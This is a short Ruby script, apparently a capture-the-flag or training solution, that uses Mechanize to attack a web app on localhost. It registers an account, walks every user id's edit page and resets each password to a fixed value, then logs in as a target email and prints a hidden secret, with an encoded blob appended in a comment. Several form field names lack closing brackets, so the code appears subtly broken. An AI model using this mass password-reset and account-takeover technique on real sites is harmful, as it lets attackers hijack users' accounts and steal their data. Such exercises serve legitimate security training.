require 'mechanize'

TARGET  = 'peter.parker@gmail.com'
PASS    = '123456789'

Mechanize.new.instance_eval do
  
  # Register new user
  get 'http://localhost:3000/users/new'

  page.forms.first.tap do |f|
    f['user[name']   = 'me'
    f['user[email]'] = 'me@me.com'
    f.submit
  end

  # Capture new user id
  max_id = page.uri.to_s
            .match(/\/users\/(...)\/edit/)
            .captures.first.to_i

  # Complete registration
  page.forms.first.tap do |f|
    f['user[password'] = PASS
    f.submit
  end

  # Loop through all users
  (1..max_id).each do |id|
    # Visit edit users page
    get "users/#{id}/edit"

    # Change password to default
    page.forms.first.tap do |f|
      f['user[password]'] = PASS
      f.submit
    end
  end

  # Login as target
  get '/session/new'

  page.forms.first.tap do |f|
    f['session[email']     = TARGET
    f['session[password]'] = PASS
    f.submit
  end

  # Output the secret
  puts page.search('.secret').text.strip
end

=begin
5MYM/2M2Dq5vdO5RJadFGY0dOzkV+2hv5Jh+Dec8yYKlcfbu9cGqq+OI/WbighLJlcJhqzSlLs8kKa1sQQRa+zmzXGW73WKZnvc
eRtOrTyebMECAEBYsLFfq7xeqiIH6Mk6N3MxkYusi6kIdkYUfV323ND/r++L/emT1Ws5xS9bXWR4QRzk+J5jRjHiOKnP+gacWga
MQ96sSzQGCxQ28InD/uqr0Or/JbqCtq+czjABHw2wPOU7g2q12Bt3C2/rUrFiQ1vKa18K1cXUUn/eigOwbwoI+IZi70ny/TX2OY
HrmnehskRni6knOT08gVCgRSV0HT2VNyKcJE05zV2NbF552d+tw3CeplpQvMdCsD7r0KxgLxNADCku37fKFUvXUwm0ZsSGfxjeB
fBkzy0v1epwT/F9dBjEhNcStYAjCUeE5EDR2uLo04Cngya7xPo5dYTCh4Ef6BXFAUpZV2raqF3Z0pBLMtMSUOlaOix43jly0GGQ
HtyVat8z47zmBMhHRVqoQSuZWTNjdIDacsbekeLw+dweELfiMGr+PFdyIeonNxTSjmHkiMJ5DQg/0c+uW4VSp8MZVhhniNtCBJO
6QiGWG1mf4fe1Gq4R6AXAuqOm0wi1FNFPAxeTZI2qCJyZsAsSuv6U/S1vZS4a2KO5L9CsATLW4xjk1pStiowCIssAoGQT+dj0L8q
A/DlfqE5300dmMsqkc+e2UduCG7GIvVOYkKZ75iVGstHq+czu3syaDnwN2asEEGGGYeF1l2i8Yf/2MCZe/KNuWkEj1+m0XLT5qv
ThmKVbV4dAgUieY88l92eaWo/cp6jBzMqLAMGJOdQWd8PXKqeShaqOLL9encChbHfESThi0w6KVce1vWH/NmKbpzpWsQwX+T28OqR
cWkmR13LImPtETVC35jMqBPnruRgIKxm9jeejOmQSs7v7qm94SXwxfE0TQ6tjEBx5QA/oAukyvVwmCXEupOd4+rJQtYfPXlbzP7Nq
Di6gY3RXl67d0i/wnkxk2fzm3UysbQBBPqWmcEFlaYqEuP4zTFv20YdNZtg/dZFLPaTkL0Xdfx/UnFTLyct2M6pI2ccoipom4OUaGwN
PTXixNuozCm9faefl3x+GPTdipjttt349xY0G1csoXxrR9MbSArgVk1xTduG9mXMetwscP+V6O1lwmGQZIQcImUx3cu1rfa/MQGqY0z
4YGPPmG0OwjYc0bGDM95ei7BdVQtx/9cyfFdvGeCSZVdmOtdKuotodia27EDLEsRoAA6QhWPMcMYDK8xP5IdPTQP9sCo7cDoYSzYvR
4XlNB1cbqDqXF+uI37/fNn/hgbh41OZV0fxFS5EOmFv7fnFWsM9kgs403oiesPA==  
=end